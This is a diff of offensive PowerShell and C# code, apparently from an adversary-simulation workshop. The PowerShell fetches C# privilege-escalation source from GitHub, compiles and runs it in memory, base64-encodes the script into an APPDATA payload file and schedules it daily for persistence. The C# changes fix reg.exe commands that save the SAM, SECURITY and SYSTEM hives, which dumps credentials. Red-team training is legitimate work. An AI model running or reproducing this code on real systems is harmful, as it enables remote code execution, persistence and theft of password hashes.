@@ -1,17 +1,17 @@
-$ps1 = @'
+$psh = @'
 $id = Get-Random
-$code = (iwr https://raw.githubusercontent.com/GhostPack/SharpUp/master/SharpUp/Program.cs -UseBasicParsing) -replace "class Program","public class Runner$id" -replace "namespace SharpUp","namespace ShipOut"
-$assemblies = ("System.Core","System.Xml.Linq","System.Data","System.Xml", "System.Data.DataSetExtensions", "Microsoft.CSharp", "System.ServiceProcess", "System.Management")
+$code = (iwr -UseBasicParsing https://raw.githubusercontent.com/mobia-security-services/adversarysimulationworkshop/main/discovery.cs) -replace "class Program","class Runny$id" -replace "namespace SharpUp","namespace ShipOut"
+$assemblies = ('System.Xml.Linq','System.Core','System.Data','System.Xml', 'System.Data.DataSetExtensions', 'Microsoft.CSharp', 'System.ServiceProcess', 'System.Management')
 Add-Type -ReferencedAssemblies $assemblies -TypeDefinition $code -Language CSharp -IgnoreWarnings
-iex "[ShipOut.Runner$id]::GetModifiableServiceBinaries()"
+iex -Command "[ShipOut.Runny$id]::GetModifiableServices()"
 '@
 
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($ps1)
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($psh)
 $encodedCommand = [Convert]::ToBase64String($bytes)
 
-$ps2 = "powershell -enc $encodedCommand | out-file $env:APPDATA\services.txt" | % { $_ | out-file $env:APPDATA\payload.ps1 }
+"powershell -enc $encodedCommand | out-file $env:APPDATA\services.txt" | % { $_ | out-file $env:APPDATA\prayload.ps1 }
 
-$A = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command $env:APPDATA\payload.ps1"
+$A = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command $env:APPDATA\prayload.ps1"
 $T = New-ScheduledTaskTrigger -Daily -At "00:01"
 $P = New-ScheduledTaskPrincipal "$env:USERNAME"
 $S = New-ScheduledTaskSettingsSet
@@ -68,7 +68,7 @@ namespace HelloWorld
             var sam = new Process {
                 StartInfo = new ProcessStartInfo {
                     FileName = @"c:\windows\system32\reg.exe",
-                    Arguments = @"hklm\sam c:\temp\sam.save"
+                    Arguments = @"save hklm\sam c:\temp\sam.save"
                 }
             };
             sam.Start();
@@ -77,7 +77,7 @@ namespace HelloWorld
             var security = new Process {
                 StartInfo = new ProcessStartInfo {
                     FileName = @"c:\windows\system32\reg.exe",
-                    Arguments = @"hklm\security c:\temp\security.save"
+                    Arguments = @"save hklm\security c:\temp\security.save"
                 }
             };
             security.Start();
@@ -86,7 +86,7 @@ namespace HelloWorld
             var system = new Process {
                 StartInfo = new ProcessStartInfo {
                     FileName = @"c:\windows\system32\reg.exe",
-                    Arguments = @"hklm\system c:\temp\system.save"
+                    Arguments = @"save hklm\system c:\temp\system.save"
                 }
             };
             system.Start();
